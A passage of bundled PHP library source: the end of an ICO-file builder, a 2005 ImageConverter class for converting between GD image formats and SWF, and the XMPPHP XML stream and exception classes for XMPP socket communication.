            foreach ($icANDmask[$key] as $y => $scanlinemaskbits) { 
                for ($i = 0; $i < strlen($scanlinemaskbits); $i += 8) { 
                    $icAND[$key] .= chr(bindec(str_pad(substr($scanlinemaskbits, $i, 8), 8, '0', STR_PAD_LEFT))); 
                } 
            } 
        } 
        foreach ($gd_image_array as $key => $gd_image) { 
            $biSizeImage = $ImageWidths[$key] * $ImageHeights[$key] * ($bpp[$key] / 8); 
            // BITMAPINFOHEADER - 40 bytes 
            $BitmapInfoHeader[$key]  = ''; 
            $BitmapInfoHeader[$key] .= "\x28\x00\x00\x00";                              // DWORD  biSize; 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($ImageWidths[$key], 4);      // LONG   biWidth; 
            // The biHeight member specifies the combined 
            // height of the XOR and AND masks. 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($ImageHeights[$key] * 2, 4); // LONG   biHeight; 
            $BitmapInfoHeader[$key] .= "\x01\x00";                                      // WORD   biPlanes; 
            $BitmapInfoHeader[$key] .= chr($bpp[$key])."\x00";                          // wBitCount; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biCompression; 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($biSizeImage, 4);            // DWORD  biSizeImage; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // LONG   biXPelsPerMeter; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // LONG   biYPelsPerMeter; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biClrUsed; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biClrImportant; 
        } 
        $icondata  = "\x00\x00";                                      // idReserved;   // Reserved (must be 0) 
        $icondata .= "\x01\x00";                                      // idType;       // Resource Type (1 for icons) 
        $icondata .= $this->LittleEndian2String(count($gd_image_array), 2);  // idCount;      // How many images? 
        $dwImageOffset = 6 + (count($gd_image_array) * 16); 
        foreach ($gd_image_array as $key => $gd_image) { 
            // ICONDIRENTRY   idEntries[1]; // An entry for each image (idCount of 'em) 
            $icondata .= chr($ImageWidths[$key]);                     // bWidth;          // Width, in pixels, of the image 
            $icondata .= chr($ImageHeights[$key]);                    // bHeight;         // Height, in pixels, of the image 
            $icondata .= chr($totalcolors[$key]);                     // bColorCount;     // Number of colors in image (0 if >=8bpp) 
            $icondata .= "\x00";                                      // bReserved;       // Reserved ( must be 0) 
            $icondata .= "\x01\x00";                                  // wPlanes;         // Color Planes 
            $icondata .= chr($bpp[$key])."\x00";                      // wBitCount;       // Bits per pixel 
            $dwBytesInRes = 40 + strlen($icXOR[$key]) + strlen($icAND[$key]); 
            $icondata .= $this->LittleEndian2String($dwBytesInRes, 4);       // dwBytesInRes;    // How many bytes in this resource? 
            $icondata .= $this->LittleEndian2String($dwImageOffset, 4);      // dwImageOffset;   // Where in the file is this image? 
            $dwImageOffset += strlen($BitmapInfoHeader[$key]); 
            $dwImageOffset += strlen($icXOR[$key]); 
            $dwImageOffset += strlen($icAND[$key]); 
        } 
        foreach ($gd_image_array as $key => $gd_image) { 
            $icondata .= $BitmapInfoHeader[$key]; 
            $icondata .= $icXOR[$key]; 
            $icondata .= $icAND[$key]; 
        } 
        return $icondata; 
    } 
    function LittleEndian2String($number, $minbytes=1) { 
        $intstring = ''; 
        while ($number > 0) { 
            $intstring = $intstring.chr($number & 255); 
            $number >>= 8; 
        } 
        return str_pad($intstring, $minbytes, "\x00", STR_PAD_RIGHT); 
    }
    function GetPixelColor(&$img, $x, $y) { 
        if (!is_resource($img)) { 
            return false; 
        } 
        return @ImageColorsForIndex($img, @ImageColorAt($img, $x, $y)); 
    } 
}
?>

<?php 
######
## ImageConverter
## Convert various image type that supported by PHP
## ie: JPEG, GIF, PNG, SWF, WBMP
## Version 0.9
## 15th January 2005
#######
## Author: Huda M Elmatsani
## Email :      justhuda ## netscape ## net
#######
## Copyright (c) 2005 Huda M Elmatsani All rights reserved.
## This program is free for any purpose use.
########
## Description:
## Casting image type from one type to another is useful for
## web experience, because each type has advantage and disadvantage.
## With JPEG you can reduce the quality to get affordable filesize,
## with GIF you can make it transparent or make an animation,
## with PNG you can avoid from GIF restriction,
## with SWF you can protect your image or make a movie.
## This class helps you doing this various conversion within a single line.
##
## Requirements:
## - GD Library
## - Ming Library
##
## Sintax:
## new ImageConverter( original_file, converted_file_type [, output]);
##
## note: output = 1 means the image is displayed to browser
##       output = 0 or no argument means the image is saved
##
## new ImageConverter('jakarta.png','jpg') => convert to JPEG
## new ImageConverter('jakarta.jpg','gif') => convert to GIF
## new ImageConverter('jakarta.gif','png') => convert to PNG
## new ImageConverter('jakarta.gif','swf') => convert to SWF
## 
##
## Example:
## new ImageConverter('jakarta.gif','jpg',1)
## the result is showed to the browser.
##
## new ImageConverter('aceh.png','swf');
## the result is saved to the disk with name 'aceh.swf'
##
## Limitation:
## Can not convert SWF file to other type :(
##
##########

class ImageConverter {

        var $imtype;
        var $im;
        var $imname;
        var $imconvertedtype;
        var $output;

        function imageConverter() {

                /* parse arguments */
                $numargs                = func_num_args();
                $imagefile      = func_get_arg(0);
                $convertedtype  = func_get_arg(1);
                $output                 = 0;
                if($numargs > 2) $this->output  = func_get_arg(2);

                /* ask the type of original file */
                $fileinfo               = pathinfo($imagefile);
                $imtype                 = $fileinfo["extension"];
                $this->imname   = basename($fileinfo["basename"],".".$imtype);
                $this->imtype   = $imtype;

                /* create the image variable of original file */
                switch ($imtype) {
                case "gif":
                        $this->im       =  imageCreateFromGIF($imagefile);
                        break;
                case "jpg":
                        $this->im       =  imageCreateFromJPEG($imagefile);
                        break;
                case "png":
                        $this->im       =  imageCreateFromPNG($imagefile);
                        break;
                case "wbmp":
                        $this->im       =  imageCreateFromWBMP($imagefile);
                        break;
                /*
                mail me if you have/find this functionality bellow  */
                /*
                case "swf":
                        $this->im       = $this->imageCreateFromSWF($imagefile);
                        break;
                */
                }

                /* convert to intended type */
                $this->convertImage($convertedtype);
        }

        function convertImage($type) {

                /* check the converted image type availability,
                   if it is not available, it will be casted to jpeg :) */
                $validtype = $this->validateType($type);


                if($this->output) {

                        /* show the image  */
                        switch($validtype){
                                case 'jpeg' :
                                case 'jpg'      :
                                        header("Content-type: image/jpeg");
                                        if($this->imtype == 'gif' or $this->imtype == 'png') {
                                                $image = $this->replaceTransparentWhite($this->im);
                                                imageJPEG($image);
                                        } else
                                        imageJPEG($this->im);
                                        break;
                                case 'gif' :
                                        header("Content-type: image/gif");
                                        imageGIF($this->im);
                                        break;
                                case 'png' :
                                        header("Content-type: image/png");
                                        imagePNG($this->im);
                                        break;
                                case 'wbmp' :
                                        header("Content-type: image/vnd.wap.wbmp");
                                        imageWBMP($this->im);
                                        break;
                                case 'swf' :
                                        header("Content-type: application/x-shockwave-flash");
                                        $this->imageSWF($this->im);
                                        break;
                        }

                } else {
                        /* save the image  */
                        switch($validtype){
                                case 'jpeg' :
                                case 'jpg'      :
                                        if($this->imtype == 'gif' or $this->imtype == 'png') {
                                                /* replace transparent with white */
                                                $image = $this->replaceTransparentWhite($this->im);
                                                imageJPEG($image,$this->imname.".jpg");
                                        } else
                                        imageJPEG($this->im,$this->imname.".jpg");
                                        break;
                                case 'gif' :
                                        imageGIF($this->im,$this->imname.".gif");
                                        break;
                                case 'png' :
                                        imagePNG($this->im,$this->imname.".png");
                                        break;
                                case 'wbmp' :
                                        imageWBMP($this->im,$this->imname.".wbmp");
                                        break;
                                case 'swf' :
                                        $this->imageSWF($this->im,$this->imname.".swf");
                                        break;

                        }

                }
        }

        /* convert image to SWF  */
        function imageSWF() {

                /* parse arguments */
                $numargs = func_num_args();
                $image   = func_get_arg(0);
                $swfname = "";
                if($numargs > 1) $swfname = func_get_arg(1);

                /* image must be in jpeg and
                   convert jpeg to SWFBitmap
                   can be done by buffering it */
                ob_start();
                imagejpeg($image);
                $buffimg = ob_get_contents();
                ob_end_clean();

                $img    = new SWFBitmap($buffimg);

                $w = $img->getWidth();
                $h = $img->getHeight();

                $movie = new SWFMovie();
                $movie->setDimension($w, $h);
                $movie->add($img);

                if($swfname)
                        $movie->save($swfname);
                else
                        $movie->output;

        }


        /* convert SWF to image  */
        function imageCreateFromSWF($swffile) {

                die("No SWF converter in this library");

        }

        function validateType($type) {
                /* check image type availability*/
                $is_available = FALSE;

                switch($type){
                        case 'jpeg' :
                        case 'jpg'      :
                                if(function_exists("imagejpeg"))
                                $is_available = TRUE;
                                break;
                        case 'gif' :
                                if(function_exists("imagegif"))
                                $is_available = TRUE;
                                break;
                        case 'png' :
                                if(function_exists("imagepng"))
                                $is_available = TRUE;
                                break;
                        case 'wbmp' :
                                if(function_exists("imagewbmp"))
                                $is_available = TRUE;
                                break;
                        case 'swf' :
                                if(class_exists("swfmovie"))
                                $is_available = TRUE;
                                break;
                }
                if(!$is_available && function_exists("imagejpeg")){
                        /* if not available, cast image type to jpeg*/
                        return "jpeg";
                }
                else if(!$is_available && !function_exists("imagejpeg")){
                   die("No image support in this PHP server");
                }
                else
                        return $type;
        }

        function replaceTransparentWhite($im){
                $src_w = ImageSX($im);
                $src_h = ImageSY($im);
                $backgroundimage = imagecreatetruecolor($src_w, $src_h);
                $white =  ImageColorAllocate ($backgroundimage, 255, 255, 255);
                ImageFill($backgroundimage,0,0,$white);
                ImageAlphaBlending($backgroundimage, TRUE);
                imagecopy($backgroundimage, $im, 0,0,0,0, $src_w, $src_h);
                return $backgroundimage;
        }
}
?>

<?php 
/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/** XMPPHP_Exception */
//require_once dirname(__FILE__) . '/Exception.php';

/** XMPPHP_XMLObj */
//require_once dirname(__FILE__) . '/XMLObj.php';

/** XMPPHP_Log */
//require_once dirname(__FILE__) . '/Log.php';

/**
 * XMPPHP XML Stream
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_XMLStream {
        /**
         * @var resource
         */
        protected $socket;
        /**
         * @var resource
         */
        protected $parser;
        /**
         * @var string
         */
        protected $buffer;
        /**
         * @var integer
         */
        protected $xml_depth = 0;
        /**
         * @var string
         */
        protected $host;
        /**
         * @var integer
         */
        protected $port;
        /**
         * @var string
         */
        protected $stream_start = '<stream>';
        /**
         * @var string
         */
        protected $stream_end = '</stream>';
        /**
         * @var boolean
         */
        protected $disconnected = false;
        /**
         * @var boolean
         */
        protected $sent_disconnect = false;
        /**
         * @var array
         */
        protected $ns_map = array();
        /**
         * @var array
         */
        protected $current_ns = array();
        /**
         * @var array
         */
        protected $xmlobj = null;
        /**
         * @var array
         */
        protected $nshandlers = array();
        /**
         * @var array
         */
        protected $xpathhandlers = array();
        /**
         * @var array
         */
        protected $idhandlers = array();
        /**
         * @var array
         */
        protected $eventhandlers = array();
        /**
         * @var integer
         */
        protected $lastid = 0;
        /**
         * @var string
         */
        protected $default_ns;
        /**
         * @var string
         */
        protected $until = '';
        /**
         * @var string
         */
        protected $until_count = '';
        /**
         * @var array
         */
        protected $until_happened = false;
        /**
         * @var array
         */
        protected $until_payload = array();
        /**
         * @var XMPPHP_Log
         */
        protected $log;
        /**
         * @var boolean
         */
        protected $reconnect = true;
        /**
         * @var boolean
         */
        protected $been_reset = false;
        /**
         * @var boolean
         */
        protected $is_server;
        /**
         * @var float
         */
        protected $last_send = 0;
        /**
         * @var boolean
         */
        protected $use_ssl = false;
        /**
         * @var integer
         */
        protected $reconnectTimeout = 30;

        /**
         * Constructor
         *
         * @param string  $host
         * @param string  $port
         * @param boolean $printlog
         * @param string  $loglevel
         * @param boolean $is_server
         */
        public function __construct($host = null, $port = null, $printlog = false, $loglevel = null, $is_server = false) {
                $this->reconnect = !$is_server;
                $this->is_server = $is_server;
                $this->host = $host;
                $this->port = $port;
                $this->setupParser();
                $this->log = new XMPPHP_Log($printlog, $loglevel);
        }

        /**
         * Destructor
         * Cleanup connection
         */
        public function __destruct() {
                if(!$this->disconnected && $this->socket) {
                        $this->disconnect();
                }
        }
        
        /**
         * Return the log instance
         *
         * @return XMPPHP_Log
         */
        public function getLog() {
                return $this->log;
        }
        
        /**
         * Get next ID
         *
         * @return integer
         */
        public function getId() {
                $this->lastid++;
                return $this->lastid;
        }

        /**
         * Set SSL
         *
         * @return integer
         */
        public function useSSL($use=true) {
                $this->use_ssl = $use;
        }

        /**
         * Add ID Handler
         *
         * @param integer $id
         * @param string  $pointer
         * @param string  $obj
         */
        public function addIdHandler($id, $pointer, $obj = null) {
                $this->idhandlers[$id] = array($pointer, $obj);
        }

        /**
         * Add Handler
         *
         * @param string $name
         * @param string  $ns
         * @param string  $pointer
         * @param string  $obj
         * @param integer $depth
         */
        public function addHandler($name, $ns, $pointer, $obj = null, $depth = 1) {
                #TODO deprication warning
                $this->nshandlers[] = array($name,$ns,$pointer,$obj, $depth);
        }

        /**
         * Add XPath Handler
         *
         * @param string $xpath
         * @param string $pointer
         * @param
         */
        public function addXPathHandler($xpath, $pointer, $obj = null) {
                if (preg_match_all("/\(?{[^\}]+}\)?(\/?)[^\/]+/", $xpath, $regs)) {
                        $ns_tags = $regs[0];
                } else {
                        $ns_tags = array($xpath);
                }
                foreach($ns_tags as $ns_tag) {
                        list($l, $r) = split("}", $ns_tag);
                        if ($r != null) {
                                $xpart = array(substr($l, 1), $r);
                        } else {
                                $xpart = array(null, $l);
                        }
                        $xpath_array[] = $xpart;
                }
                $this->xpathhandlers[] = array($xpath_array, $pointer, $obj);
        }

        /**
         * Add Event Handler
         *
         * @param integer $id
         * @param string  $pointer
         * @param string  $obj
         */
        public function addEventHandler($name, $pointer, $obj) {
                $this->eventhandlers[] = array($name, $pointer, $obj);
        }

        /**
         * Connect to XMPP Host
         *
         * @param integer $timeout
         * @param boolean $persistent
         * @param boolean $sendinit
         */
        public function connect($timeout = 30, $persistent = false, $sendinit = true) {
                $this->sent_disconnect = false;
                $starttime = time();
                
                do {
                        $this->disconnected = false;
                        $this->sent_disconnect = false;
                        if($persistent) {
                                $conflag = STREAM_CLIENT_CONNECT | STREAM_CLIENT_PERSISTENT;
                        } else {
                                $conflag = STREAM_CLIENT_CONNECT;
                        }
                        $conntype = 'tcp';
                        if($this->use_ssl) $conntype = 'ssl';
                        $this->log->log("Connecting to $conntype://{$this->host}:{$this->port}");
                        try {
                                $this->socket = @stream_socket_client("$conntype://{$this->host}:{$this->port}", $errno, $errstr, $timeout, $conflag);
                        } catch (Exception $e) {
                                throw new XMPPHP_Exception($e->getMessage());
                        }
                        if(!$this->socket) {
                                $this->log->log("Could not connect.",  XMPPHP_Log::LEVEL_ERROR);
                                $this->disconnected = true;
                                # Take it easy for a few seconds
                                sleep(min($timeout, 5));
                        }
                } while (!$this->socket && (time() - $starttime) < $timeout);
                
                if ($this->socket) {
                        stream_set_blocking($this->socket, 1);
                        if($sendinit) $this->send($this->stream_start);
                } else {
                        throw new XMPPHP_Exception("Could not connect before timeout.");
                }
        }

        /**
         * Reconnect XMPP Host
         */
        public function doReconnect() {
                if(!$this->is_server) {
                        $this->log->log("Reconnecting ($this->reconnectTimeout)...",  XMPPHP_Log::LEVEL_WARNING);
                        $this->connect($this->reconnectTimeout, false, false);
                        $this->reset();
                        $this->event('reconnect');
                }
        }

        public function setReconnectTimeout($timeout) {
                $this->reconnectTimeout = $timeout;
        }
        
        /**
         * Disconnect from XMPP Host
         */
        public function disconnect() {
                $this->log->log("Disconnecting...",  XMPPHP_Log::LEVEL_VERBOSE);
                if(false == (bool) $this->socket) {
                        return;
                }
                $this->reconnect = false;
                $this->send($this->stream_end);
                $this->sent_disconnect = true;
                $this->processUntil('end_stream', 5);
                $this->disconnected = true;
        }

        /**
         * Are we are disconnected?
         *
         * @return boolean
         */
        public function isDisconnected() {
                return $this->disconnected;
        }

        /**
         * Core reading tool
         * 0 -> only read if data is immediately ready
         * NULL -> wait forever and ever
         * integer -> process for this amount of time 
         */
        
        private function __process($maximum=5) {
                
                $remaining = $maximum;
                
                do {
                        $starttime = (microtime(true) * 1000000);
                        $read = array($this->socket);
                        $write = array();
                        $except = array();
                        if (is_null($maximum)) {
                                $secs = NULL;
                                $usecs = NULL;
                        } else if ($maximum == 0) {
                                $secs = 0;
                                $usecs = 0;
                        } else {
                                $usecs = $remaining % 1000000;
                                $secs = floor(($remaining - $usecs) / 1000000);
                        }
                        $updated = @stream_select($read, $write, $except, $secs, $usecs);
                        if ($updated === false) {
                                $this->log->log("Error on stream_select()",  XMPPHP_Log::LEVEL_VERBOSE);                                
                                if ($this->reconnect) {
                                        $this->doReconnect();
                                } else {
                                        fclose($this->socket);
                                        $this->socket = NULL;
                                        return false;
                                }
                        } else if ($updated > 0) {
                                # XXX: Is this big enough?
                                $buff = @fread($this->socket, 4096);
                                if(!$buff) { 
                                        if($this->reconnect) {
                                                $this->doReconnect();
                                        } else {
                                                fclose($this->socket);
                                                $this->socket = NULL;
                                                return false;
                                        }
                                }
                                $this->log->log("RECV: $buff",  XMPPHP_Log::LEVEL_VERBOSE);
                                xml_parse($this->parser, $buff, false);
                        } else {
                                # $updated == 0 means no changes during timeout.
                        }
                        $endtime = (microtime(true)*1000000);
                        $time_past = $endtime - $starttime;
                        $remaining = $remaining - $time_past;
                } while (is_null($maximum) || $remaining > 0);
                return true;
        }
        
        /**
         * Process
         *
         * @return string
         */
        public function process() {
                $this->__process(NULL);
        }

        /**
         * Process until a timeout occurs
         *
         * @param integer $timeout
         * @return string
         */
        public function processTime($timeout=NULL) {
                if (is_null($timeout)) {
                        return $this->__process(NULL);
                } else {
                        return $this->__process($timeout * 1000000);
                }
        }

        /**
         * Process until a specified event or a timeout occurs
         *
         * @param string|array $event
         * @param integer $timeout
         * @return string
         */
        public function processUntil($event, $timeout=-1) {
                $start = time();
                if(!is_array($event)) $event = array($event);
                $this->until[] = $event;
                end($this->until);
                $event_key = key($this->until);
                reset($this->until);
                $this->until_count[$event_key] = 0;
                $updated = '';
                while(!$this->disconnected and $this->until_count[$event_key] < 1 and (time() - $start < $timeout or $timeout == -1)) {
                        $this->__process();
                }
                if(array_key_exists($event_key, $this->until_payload)) {
                        $payload = $this->until_payload[$event_key];
                        unset($this->until_payload[$event_key]);
                        unset($this->until_count[$event_key]);
                        unset($this->until[$event_key]);
                } else {
                        $payload = array();
                }
                return $payload;
        }

        /**
         * Obsolete?
         */
        public function Xapply_socket($socket) {
                $this->socket = $socket;
        }

        /**
         * XML start callback
         * 
         * @see xml_set_element_handler
         *
         * @param resource $parser
         * @param string   $name
         */
        public function startXML($parser, $name, $attr) {
                if($this->been_reset) {
                        $this->been_reset = false;
                        $this->xml_depth = 0;
                }
                $this->xml_depth++;
                if(array_key_exists('XMLNS', $attr)) {
                        $this->current_ns[$this->xml_depth] = $attr['XMLNS'];
                } else {
                        $this->current_ns[$this->xml_depth] = $this->current_ns[$this->xml_depth - 1];
                        if(!$this->current_ns[$this->xml_depth]) $this->current_ns[$this->xml_depth] = $this->default_ns;
                }
                $ns = $this->current_ns[$this->xml_depth];
                foreach($attr as $key => $value) {
                        if(strstr($key, ":")) {
                                $key = explode(':', $key);
                                $key = $key[1];
                                $this->ns_map[$key] = $value;
                        }
                }
                if(!strstr($name, ":") === false)
                {
                        $name = explode(':', $name);
                        $ns = $this->ns_map[$name[0]];
                        $name = $name[1];
                }
                $obj = new XMPPHP_XMLObj($name, $ns, $attr);
                if($this->xml_depth > 1) {
                        $this->xmlobj[$this->xml_depth - 1]->subs[] = $obj;
                }
                $this->xmlobj[$this->xml_depth] = $obj;
        }

        /**
         * XML end callback
         * 
         * @see xml_set_element_handler
         *
         * @param resource $parser
         * @param string   $name
         */
        public function endXML($parser, $name) {
                #$this->log->log("Ending $name",  XMPPHP_Log::LEVEL_DEBUG);
                #print "$name\n";
                if($this->been_reset) {
                        $this->been_reset = false;
                        $this->xml_depth = 0;
                }
                $this->xml_depth--;
                if($this->xml_depth == 1) {
                        #clean-up old objects
                        #$found = false; #FIXME This didn't appear to be in use --Gar
                        foreach($this->xpathhandlers as $handler) {
                                if (is_array($this->xmlobj) && array_key_exists(2, $this->xmlobj)) {
                                        $searchxml = $this->xmlobj[2];
                                        $nstag = array_shift($handler[0]);
                                        if (($nstag[0] == null or $searchxml->ns == $nstag[0]) and ($nstag[1] == "*" or $nstag[1] == $searchxml->name)) {
                                                foreach($handler[0] as $nstag) {
                                                        if ($searchxml !== null and $searchxml->hasSub($nstag[1], $ns=$nstag[0])) {
                                                                $searchxml = $searchxml->sub($nstag[1], $ns=$nstag[0]);
                                                        } else {
                                                                $searchxml = null;
                                                                break;
                                                        }
                                                }
                                                if ($searchxml !== null) {
                                                        if($handler[2] === null) $handler[2] = $this;
                                                        $this->log->log("Calling {$handler[1]}",  XMPPHP_Log::LEVEL_DEBUG);
                                                        $handler[2]->$handler[1]($this->xmlobj[2]);
                                                }
                                        }
                                }
                        }
                        foreach($this->nshandlers as $handler) {
                                if($handler[4] != 1 and array_key_exists(2, $this->xmlobj) and  $this->xmlobj[2]->hasSub($handler[0])) {
                                        $searchxml = $this->xmlobj[2]->sub($handler[0]);
                                } elseif(is_array($this->xmlobj) and array_key_exists(2, $this->xmlobj)) {
                                        $searchxml = $this->xmlobj[2];
                                }
                                if($searchxml !== null and $searchxml->name == $handler[0] and ($searchxml->ns == $handler[1] or (!$handler[1] and $searchxml->ns == $this->default_ns))) {
                                        if($handler[3] === null) $handler[3] = $this;
                                        $this->log->log("Calling {$handler[2]}",  XMPPHP_Log::LEVEL_DEBUG);
                                        $handler[3]->$handler[2]($this->xmlobj[2]);
                                }
                        }
                        foreach($this->idhandlers as $id => $handler) {
                                if(array_key_exists('id', $this->xmlobj[2]->attrs) and $this->xmlobj[2]->attrs['id'] == $id) {
                                        if($handler[1] === null) $handler[1] = $this;
                                        $handler[1]->$handler[0]($this->xmlobj[2]);
                                        #id handlers are only used once
                                        unset($this->idhandlers[$id]);
                                        break;
                                }
                        }
                        if(is_array($this->xmlobj)) {
                                $this->xmlobj = array_slice($this->xmlobj, 0, 1);
                                if(isset($this->xmlobj[0]) && $this->xmlobj[0] instanceof XMPPHP_XMLObj) {
                                        $this->xmlobj[0]->subs = null;
                                }
                        }
                        unset($this->xmlobj[2]);
                }
                if($this->xml_depth == 0 and !$this->been_reset) {
                        if(!$this->disconnected) {
                                if(!$this->sent_disconnect) {
                                        $this->send($this->stream_end);
                                }
                                $this->disconnected = true;
                                $this->sent_disconnect = true;
                                fclose($this->socket);
                                if($this->reconnect) {
                                        $this->doReconnect();
                                }
                        }
                        $this->event('end_stream');
                }
        }

        /**
         * XML character callback
         * @see xml_set_character_data_handler
         *
         * @param resource $parser
         * @param string   $data
         */
        public function charXML($parser, $data) {
                if(array_key_exists($this->xml_depth, $this->xmlobj)) {
                        $this->xmlobj[$this->xml_depth]->data .= $data;
                }
        }

        /**
         * Event?
         *
         * @param string $name
         * @param string $payload
         */
        public function event($name, $payload = null) {
                $this->log->log("EVENT: $name",  XMPPHP_Log::LEVEL_DEBUG);
                foreach($this->eventhandlers as $handler) {
                        if($name == $handler[0]) {
                                if($handler[2] === null) {
                                        $handler[2] = $this;
                                }
                                $handler[2]->$handler[1]($payload);
                        }
                }
                foreach($this->until as $key => $until) {
                        if(is_array($until)) {
                                if(in_array($name, $until)) {
                                        $this->until_payload[$key][] = array($name, $payload);
                                        if(!isset($this->until_count[$key])) {
                                                $this->until_count[$key] = 0;
                                        }
                                        $this->until_count[$key] += 1;
                                        #$this->until[$key] = false;
                                }
                        }
                }
        }

        /**
         * Read from socket
         */
        public function read() {
                $buff = @fread($this->socket, 1024);
                if(!$buff) { 
                        if($this->reconnect) {
                                $this->doReconnect();
                        } else {
                                fclose($this->socket);
                                return false;
                        }
                }
                $this->log->log("RECV: $buff",  XMPPHP_Log::LEVEL_VERBOSE);
                xml_parse($this->parser, $buff, false);
        }

        /**
         * Send to socket
         *
         * @param string $msg
         */
        public function send($msg, $timeout=NULL) {

                if (is_null($timeout)) {
                        $secs = NULL;
                        $usecs = NULL;
                } else if ($timeout == 0) {
                        $secs = 0;
                        $usecs = 0;
                } else {
                        $maximum = $timeout * 1000000;
                        $usecs = $maximum % 1000000;
                        $secs = floor(($maximum - $usecs) / 1000000);
                }
                
                $read = array();
                $write = array($this->socket);
                $except = array();
                
                $select = @stream_select($read, $write, $except, $secs, $usecs);
                
                if($select === False) {
                        $this->log->log("ERROR sending message; reconnecting.");
                        $this->doReconnect();
                        # TODO: retry send here
                        return false;
                } elseif ($select > 0) {
                        $this->log->log("Socket is ready; send it.", XMPPHP_Log::LEVEL_VERBOSE);
                } else {
                        $this->log->log("Socket is not ready; break.", XMPPHP_Log::LEVEL_ERROR);
                        return false;
                }
                
                $sentbytes = @fwrite($this->socket, $msg);
                $this->log->log("SENT: " . mb_substr($msg, 0, $sentbytes, '8bit'), XMPPHP_Log::LEVEL_VERBOSE);
                if($sentbytes === FALSE) {
                        $this->log->log("ERROR sending message; reconnecting.", XMPPHP_Log::LEVEL_ERROR);
                        $this->doReconnect();
                        return false;
                }
                $this->log->log("Successfully sent $sentbytes bytes.", XMPPHP_Log::LEVEL_VERBOSE);
                return $sentbytes;
        }

        public function time() {
                list($usec, $sec) = explode(" ", microtime());
                return (float)$sec + (float)$usec;
        }

        /**
         * Reset connection
         */
        public function reset() {
                $this->xml_depth = 0;
                unset($this->xmlobj);
                $this->xmlobj = array();
                $this->setupParser();
                if(!$this->is_server) {
                        $this->send($this->stream_start);
                }
                $this->been_reset = true;
        }

        /**
         * Setup the XML parser
         */
        public function setupParser() {
                $this->parser = xml_parser_create('UTF-8');
                xml_parser_set_option($this->parser, XML_OPTION_SKIP_WHITE, 1);
                xml_parser_set_option($this->parser, XML_OPTION_TARGET_ENCODING, 'UTF-8');
                xml_set_object($this->parser, $this);
                xml_set_element_handler($this->parser, 'startXML', 'endXML');
                xml_set_character_data_handler($this->parser, 'charXML');
        }

        public function readyToProcess() {
                $read = array($this->socket);
                $write = array();
                $except = array();
                $updated = @stream_select($read, $write, $except, 0);
                return (($updated !== false) && ($updated > 0));
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package    XMPPHP
 * @author     Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author     Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP Exception
 *
 * @category   xmpphp 
 * @package    XMPPHP
 * @author     Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author     Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version    $Id$
 */
class XMPPHP_Exception extends Exception {
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP XML Object
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
